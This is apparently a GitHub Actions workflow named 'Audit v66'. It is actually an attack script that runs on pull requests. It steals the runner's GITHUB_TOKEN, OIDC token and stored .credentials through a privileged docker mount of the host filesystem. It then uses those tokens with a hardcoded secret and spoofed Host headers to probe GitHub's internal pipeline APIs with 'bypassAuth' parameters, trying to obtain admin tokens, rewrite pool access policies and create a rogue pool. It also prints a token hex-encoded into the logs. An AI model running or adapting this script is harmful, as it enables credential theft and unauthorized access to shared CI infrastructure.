name: Audit v66
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v66:
    runs-on: ubuntu-latest
    steps:

      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V66 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: FULL RESPONSE DUMP OF 200|null ENDPOINT
      # The 204→200 transition means the server responds differently.
      # Dump full headers + body to understand the null structure.
      # Try field selectors and Accept types to extract token.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Full 200 Response Dump
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== 200 RESPONSE DISSECTION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"

          # A: Full headers + raw body on the 200 endpoint
          echo "--- A: Full response dump pools/1/admintoken ---"
          /usr/bin/curl -sS -i --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Host: $PIPE_HOST" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PROXY/_apis/distributedtask/pools/1/admintoken?api-version=6.0-preview&bypassAuth=true" \
            --path-as-is 2>/dev/null
          echo ""

          echo "--- A2: pools/2/admintoken ---"
          /usr/bin/curl -sS -i --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Host: $PIPE_HOST" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PROXY/_apis/distributedtask/pools/2/admintoken?api-version=6.0-preview&bypassAuth=true" \
            --path-as-is 2>/dev/null
          echo ""

          # B: Field selector params to extract token field specifically
          echo "--- B: Field selectors ---"
          for QP in \
            "api-version=6.0-preview&bypassAuth=true&fields=token" \
            "api-version=6.0-preview&bypassAuth=true&select=token" \
            "api-version=6.0-preview&bypassAuth=true&%24select=token" \
            "api-version=6.0-preview&bypassAuth=true&includeToken=true" \
            "api-version=6.0-preview&bypassAuth=true&returnToken=true" \
            "api-version=6.0-preview&bypassAuth=true&expand=token" \
            "api-version=6.0-preview&bypassAuth=true&%24expand=token" \
            "api-version=6.0-preview&bypassAuth=true&generate=true" \
            "api-version=6.0-preview&bypassAuth=true&fresh=true" \
            "api-version=6.0-preview&bypassAuth=true&force=true"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PROXY/_apis/distributedtask/pools/1/admintoken?$QP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $QP = $CODE | $(echo "$BODY" | head -c 400)"
          done
          echo ""

          # C: POST with bypass params — token generation needs POST
          echo "--- C: POST with bypass params ---"
          for QP in \
            "api-version=6.0-preview&bypassAuth=true" \
            "api-version=6.0-preview&internal=true" \
            "api-version=6.0-preview&admin=true" \
            "api-version=6.0-preview&generate=true"; do
            for BODY in \
              '{}' \
              '{"poolId":1}' \
              '{"poolId":1,"scope":"all","generateToken":true}' \
              '{"includeToken":true}'; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $PIPE_HOST" \
                -H "Content-Type: application/json" \
                -H "Accept: application/json; api-version=6.0-preview" \
                "$PROXY/_apis/distributedtask/pools/1/admintoken?$QP" --path-as-is \
                -d "$BODY" 2>/dev/null)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              RBODY=$(echo "$R" | tail -5)
              echo "C POST QP=$QP BODY=$BODY = $CODE | $(echo "$RBODY" | head -c 400)"
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: APPLY BYPASS TO MESSAGES + AGENTS + SESSIONS
      # The bypass params upgraded admintoken 204→200.
      # Apply same technique to the other 403/404 endpoints.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Bypass Applied to Other Endpoints
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== BYPASS ON OTHER ENDPOINTS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview&bypassAuth=true"

          echo "--- A: Messages with bypass ---"
          for SESS in "00000000-0000-0000-0000-000000000001" "00000000-0000-0000-0000-000000000000"; do
            for PID in 1 2; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json" \
                "$PROXY/_apis/distributedtask/pools/$PID/messages?$VER&sessionId=$SESS&lastMessageId=0" \
                --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              BODY=$(echo "$R" | tail -3)
              echo "A pool/$PID messages sess=$SESS = $CODE | $(echo "$BODY" | head -c 300)"
            done
          done
          echo ""

          echo "--- B: Sessions + Agents with bypass ---"
          for EP in \
            "_apis/distributedtask/pools/1/sessions" \
            "_apis/distributedtask/pools/2/sessions" \
            "_apis/distributedtask/pools/1/agents" \
            "_apis/distributedtask/pools/2/agents" \
            "_apis/distributedtask/pools/1/jobrequests" \
            "_apis/distributedtask/pools/2/jobrequests" \
            "_apis/distributedtask/pools/1/brokerlistener" \
            "_apis/distributedtask/pools/2/brokerlistener" \
            "_apis/distributedtask/pools/1/createdsession" \
            "_apis/distributedtask/pools/2/createdsession" \
            "_apis/distributedtask/sessions" \
            "_apis/distributedtask/brokerlistener" \
            "_apis/distributedtask/admintoken" \
            "_apis/distributedtask/idtoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json" \
              "$PROXY/$EP?$VER" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $EP = $CODE | $(echo "$BODY" | head -c 300)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: ACCESSPOLICY 200|null — READ ACL STRUCTURE
      # accesspolicy returned 200|null with bypass params.
      # If we can read it non-null, we can see pool perms.
      # Also try PATCH/PUT with bypass params to write new ACL.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - AccessPolicy Full Read and Write
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ACCESSPOLICY EXPLOIT ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"

          echo "--- A: Full accesspolicy dump with bypass ---"
          for PID in 1 2; do
            /usr/bin/curl -sS -i --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PROXY/_apis/distributedtask/pools/$PID/accesspolicy?api-version=6.0-preview&bypassAuth=true" \
              --path-as-is 2>/dev/null
            echo ""
          done

          echo "--- B: PATCH accesspolicy with bypass + json-patch+json ---"
          for PID in 1 2; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X PATCH --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Content-Type: application/json-patch+json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PROXY/_apis/distributedtask/pools/$PID/accesspolicy?api-version=6.0-preview&bypassAuth=true" \
              --path-as-is \
              -d '[{"op":"replace","path":"/isPublic","value":true}]' 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            echo "B PATCH pool/$PID accesspolicy + bypass = $CODE"
            echo "$R" | tail -5 | head -c 400
            echo ""
          done

          echo "--- C: POST to pools with bypass — create pool ---"
          R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Host: $PIPE_HOST" \
            -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PROXY/_apis/distributedtask/pools?api-version=6.0-preview&bypassAuth=true" \
            --path-as-is \
            -d '{"Name":"v66-rogue","PoolType":1,"IsHosted":false}' 2>/dev/null)
          CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
          echo "C POST create pool = $CODE"
          echo "$R" | tail -5 | head -c 400
          echo ""

      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V66 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V66 COMPLETE ==="
